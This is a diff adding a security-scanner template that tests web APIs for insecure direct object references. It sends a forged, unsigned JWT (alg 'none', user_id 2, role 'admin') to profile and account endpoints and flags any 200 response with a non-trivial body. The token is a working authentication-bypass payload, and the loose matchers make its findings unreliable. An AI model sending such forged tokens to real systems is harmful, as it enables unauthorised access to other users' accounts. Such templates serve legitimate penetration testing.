@@ -1,0 +1,29 @@
+id: m7-idor-jwt-manipulation
+info:
+  name: M7 - IDOR via JWT Claim Manipulation
+  author: Sharlix
+  severity: critical
+  description: IDOR by modifying user_id/role claims in JWT tokens
+  tags: idor,jwt,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/account"
+      - "{{BaseURL}}/api/user/me"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoyLCJyb2xlIjoiYWRtaW4ifQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 50"
+          - "!contains(body, 'invalid token') && !contains(body, 'unauthorized')"
+        condition: and
